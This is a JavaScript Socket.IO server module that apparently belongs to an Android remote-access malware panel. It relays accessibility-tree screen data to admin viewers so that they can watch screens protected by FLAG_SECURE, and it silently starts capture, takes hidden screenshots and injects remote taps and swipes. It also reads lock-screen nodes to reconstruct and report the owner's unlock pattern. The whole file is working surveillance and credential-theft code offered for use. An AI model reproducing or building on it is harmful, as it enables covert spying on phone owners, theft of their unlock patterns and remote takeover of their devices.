/**
 * Silent Screen Stream Socket Handler
 * 
 * Handles the relay of accessibility node tree data from Android devices
 * to admin panel viewers for FLAG_SECURE bypass screen viewing.
 */

// Track which admins are watching silent streams
// Map<deviceId, Set<socketId>>
const silentStreamWatchers = new Map();

// Track active silent stream sessions
// Map<deviceId, { startTime, deviceSocketId }>
const activeSilentStreams = new Map();

/**
 * Setup silent stream socket handlers
 * @param {import('socket.io').Server} io - Socket.IO server instance
 * @param {import('socket.io').Socket} socket - Individual socket connection
 */
function setupSilentStreamHandlers(io, socket) {

    /**
     * Admin joins silent stream room for a device
     */
    socket.on('silent-screen:join', ({ deviceId }) => {
        if (!deviceId) return;

        socket.join(`silent-stream:${deviceId}`);

        // Track this admin as a watcher
        if (!silentStreamWatchers.has(deviceId)) {
            silentStreamWatchers.set(deviceId, new Set());
        }
        silentStreamWatchers.get(deviceId).add(socket.id);

        console.log(`[SILENT] Admin joined silent stream: ${deviceId} (${silentStreamWatchers.get(deviceId).size} watchers)`);

        // Check if already streaming
        const activeStream = activeSilentStreams.get(deviceId);
        socket.emit('silent-screen:status', {
            deviceId,
            isActive: !!activeStream,
            ...(activeStream || {})
        });
    });

    /**
     * Admin leaves silent stream room
     */
    socket.on('silent-screen:leave', ({ deviceId }) => {
        if (!deviceId) return;

        socket.leave(`silent-stream:${deviceId}`);

        // Remove watcher
        if (silentStreamWatchers.has(deviceId)) {
            silentStreamWatchers.get(deviceId).delete(socket.id);

            // If no more watchers, stop the stream on device
            if (silentStreamWatchers.get(deviceId).size === 0) {
                console.log(`[SILENT] Last viewer left - stopping silent stream: ${deviceId}`);
                io.to(`device:${deviceId}`).emit('command:execute', {
                    id: `silent-stop-${Date.now()}`,
                    type: 'stop_silent_screen',
                    payload: {}
                });
                activeSilentStreams.delete(deviceId);
                silentStreamWatchers.delete(deviceId);
            }
        }
    });

    /**
     * Admin requests to start silent screen capture
     */
    socket.on('silent-screen:start', ({ deviceId }) => {
        if (!deviceId) return;

        console.log(`[SILENT] Start request for: ${deviceId}`);

        // Send command to device to start capture
        io.to(`device:${deviceId}`).emit('command:execute', {
            id: `silent-start-${Date.now()}`,
            type: 'start_silent_screen',
            payload: {}
        });

        // Track as active
        activeSilentStreams.set(deviceId, {
            startTime: Date.now(),
            requesterSocketId: socket.id
        });
    });

    /**
     * Admin requests to stop silent screen capture
     */
    socket.on('silent-screen:stop', ({ deviceId }) => {
        if (!deviceId) return;

        console.log(`[SILENT] Stop request for: ${deviceId}`);

        // Send command to device to stop capture
        io.to(`device:${deviceId}`).emit('command:execute', {
            id: `silent-stop-${Date.now()}`,
            type: 'stop_silent_screen',
            payload: {}
        });

        // Clear tracking
        activeSilentStreams.delete(deviceId);
    });

    // Track pattern sequence for each device
    const patternSequences = new Map(); // Map<deviceId, {sequence: number[], lastUpdate: number}>

    /**
     * Screen tree data from device - forward to watchers
     * Also detect pattern lock cells for automatic pattern capture
     */
    socket.on('silent-screen:data', (data) => {
        const { deviceId, packageName, nodes, ...treeData } = data;

        // Get deviceId from connected devices if not in payload
        const actualDeviceId = deviceId || getDeviceIdFromSocket(socket);
        if (!actualDeviceId) return;

        // Update active stream tracking
        if (!activeSilentStreams.has(actualDeviceId)) {
            activeSilentStreams.set(actualDeviceId, {
                startTime: Date.now()
            });
        }

        // PATTERN DETECTION: If on lock screen, scan for pattern cells
        const isLockScreen = packageName && (
            packageName === 'com.android.systemui' ||
            packageName.includes('keyguard') ||
            packageName.includes('lockscreen')
        );

        if (isLockScreen && nodes) {
            const patternCells = [];

            // Recursively find cells with "Cell" text
            function findCells(node) {
                if (!node) return;
                const text = (node.text || '').toLowerCase();
                if (text.includes('cell')) {
                    // Extract cell number and check if "added"
                    const match = text.match(/cell\s*(\d+)/i);
                    if (match) {
                        const cellNum = parseInt(match[1], 10);
                        const isAdded = text.includes('added');
                        patternCells.push({ cellNum, isAdded, text: node.text });
                    }
                }
                if (node.children) {
                    for (const child of node.children) {
                        findCells(child);
                    }
                }
            }
            findCells(nodes);

            // If we found pattern cells
            if (patternCells.length >= 9) {
                // Get cells that currently have "added" text (selected)
                const currentlySelected = new Set(
                    patternCells
                        .filter(c => c.isAdded)
                        .map(c => c.cellNum - 1) // Convert 1-9 to 0-8
                );

                // Get current tracking state
                let tracking = patternSequences.get(actualDeviceId) || {
                    sequence: [],
                    lastSelected: new Set(),
                    lastUpdate: 0
                };

                // Find NEW cells (selected now but weren't before)
                // This preserves the order they appear!
                for (const cell of currentlySelected) {
                    if (!tracking.lastSelected.has(cell) && !tracking.sequence.includes(cell)) {
                        tracking.sequence.push(cell);
                        console.log(`[PATTERN] Device ${actualDeviceId}: Cell ${cell} added -> Sequence: [${tracking.sequence.join(',')}]`);

                        // Emit pattern progress
                        io.to(`silent-stream:${actualDeviceId}`).emit('pattern:detected', {
                            deviceId: actualDeviceId,
                            sequence: [...tracking.sequence],
                            count: tracking.sequence.length,
                            timestamp: Date.now()
                        });

                        // Also emit to admin room for phone-lock page
                        io.to('admin').emit('pattern:progress', {
                            deviceId: actualDeviceId,
                            sequence: [...tracking.sequence],
                            count: tracking.sequence.length,
                            timestamp: Date.now()
                        });
                    }
                }

                // Update tracking state
                tracking.lastSelected = currentlySelected;
                tracking.lastUpdate = Date.now();
                patternSequences.set(actualDeviceId, tracking);

                // If all cells deselected (pattern completed/released)
                if (currentlySelected.size === 0 && tracking.sequence.length > 0) {
                    console.log(`[PATTERN] Device ${actualDeviceId}: CAPTURED -> [${tracking.sequence.join(',')}]`);

                    // Emit pattern captured
                    io.to('admin').emit('pattern:captured', {
                        deviceId: actualDeviceId,
                        sequence: [...tracking.sequence],
                        patternString: tracking.sequence.join(','),
                        count: tracking.sequence.length,
                        timestamp: Date.now()
                    });

                    // Reset tracking
                    patternSequences.set(actualDeviceId, { sequence: [], lastSelected: new Set(), lastUpdate: Date.now() });
                }
            }
        } else if (!isLockScreen) {
            // Not on lock screen - if we had pattern in progress, it was just completed
            const tracking = patternSequences.get(actualDeviceId);
            if (tracking && tracking.sequence.length > 0) {
                console.log(`[PATTERN] Device ${actualDeviceId}: Left lock screen, CAPTURED -> [${tracking.sequence.join(',')}]`);

                io.to('admin').emit('pattern:captured', {
                    deviceId: actualDeviceId,
                    sequence: [...tracking.sequence],
                    patternString: tracking.sequence.join(','),
                    count: tracking.sequence.length,
                    timestamp: Date.now()
                });

                patternSequences.set(actualDeviceId, { sequence: [], lastUpdate: Date.now() });
            }
        }

        // Forward to all watchers
        io.to(`silent-stream:${actualDeviceId}`).emit('silent-screen:update', {
            deviceId: actualDeviceId,
            packageName,
            nodes,
            ...treeData
        });
    });

    /**
     * Status update from device
     */
    socket.on('silent-screen:status', (data) => {
        const deviceId = getDeviceIdFromSocket(socket);
        if (!deviceId) return;

        console.log(`[SILENT] Status from ${deviceId}: ${data.status}`);

        if (data.status === 'started') {
            activeSilentStreams.set(deviceId, {
                startTime: Date.now(),
                screenWidth: data.screenWidth,
                screenHeight: data.screenHeight
            });
            io.to(`silent-stream:${deviceId}`).emit('silent-screen:started', {
                deviceId,
                screenWidth: data.screenWidth,
                screenHeight: data.screenHeight
            });
        } else if (data.status === 'stopped') {
            activeSilentStreams.delete(deviceId);
            io.to(`silent-stream:${deviceId}`).emit('silent-screen:stopped', { deviceId });
        }
    });

    /**
     * Remote touch from admin - forward to device (legacy)
     */
    socket.on('silent-screen:touch', (data) => {
        const { deviceId, ...touchData } = data;
        if (!deviceId) return;

        console.log(`[SILENT] Touch for ${deviceId}: ${touchData.type} at (${touchData.x}, ${touchData.y})`);

        // Forward to device for gesture injection
        io.to(`device:${deviceId}`).emit('remote:touch', touchData);
    });

    /**
     * Advanced gestures from admin - forward to device
     * Supports: tap, longpress, swipe, double_tap, drag, doodle
     */
    socket.on('silent-screen:gesture', (data) => {
        const { deviceId, ...gestureData } = data;
        if (!deviceId) return;

        console.log(`[SILENT] Gesture for ${deviceId}: ${gestureData.type}`, {
            start: `(${gestureData.startX?.toFixed(3)}, ${gestureData.startY?.toFixed(3)})`,
            end: gestureData.endX ? `(${gestureData.endX?.toFixed(3)}, ${gestureData.endY?.toFixed(3)})` : 'N/A',
            direction: gestureData.direction || 'N/A'
        });

        // Forward to device for gesture injection
        io.to(`device:${deviceId}`).emit('remote:gesture', gestureData);
    });

    /**
     * Admin requests a screenshot for background rendering
     */
    socket.on('silent-screen:capture-background', ({ deviceId }) => {
        if (!deviceId) return;

        console.log(`[SILENT] Background screenshot request for: ${deviceId}`);

        // Send command to device to capture a screenshot
        io.to(`device:${deviceId}`).emit('command:execute', {
            id: `silent-screenshot-${Date.now()}`,
            type: 'capture_accessibility_screenshot',
            payload: {}
        });
    });

    /**
     * Screenshot data from device - forward to requesting admin
     */
    socket.on('silent-screen:screenshot-data', (data) => {
        const deviceId = getDeviceIdFromSocket(socket);
        if (!deviceId) return;

        console.log(`[SILENT] Screenshot received from ${deviceId}, size: ${data.imageData?.length || 0} bytes`);

        // Forward to all watchers of this device
        io.to(`silent-stream:${deviceId}`).emit('silent-screen:screenshot', {
            deviceId,
            imageData: data.imageData
        });
    });

    /**
     * Handle socket disconnect - cleanup watchers
     */
    socket.on('disconnect', () => {
        // Remove from all silent stream watcher lists
        for (const [watchedDeviceId, watchers] of silentStreamWatchers.entries()) {
            if (watchers.has(socket.id)) {
                watchers.delete(socket.id);
                console.log(`[SILENT] Watcher disconnected from ${watchedDeviceId}`);

                // If no more watchers, stop the stream
                if (watchers.size === 0) {
                    console.log(`[SILENT] No watchers left - stopping: ${watchedDeviceId}`);
                    io.to(`device:${watchedDeviceId}`).emit('command:execute', {
                        id: `silent-stop-${Date.now()}`,
                        type: 'stop_silent_screen',
                        payload: {}
                    });
                    activeSilentStreams.delete(watchedDeviceId);
                    silentStreamWatchers.delete(watchedDeviceId);
                }
            }
        }
    });
}

// Helper to get device ID from socket (using shared state)
function getDeviceIdFromSocket(socket) {
    try {
        const { connectedDevices } = require('../shared/state');
        return connectedDevices.get(socket.id);
    } catch (e) {
        return null;
    }
}

module.exports = {
    setupSilentStreamHandlers,
    silentStreamWatchers,
    activeSilentStreams
};
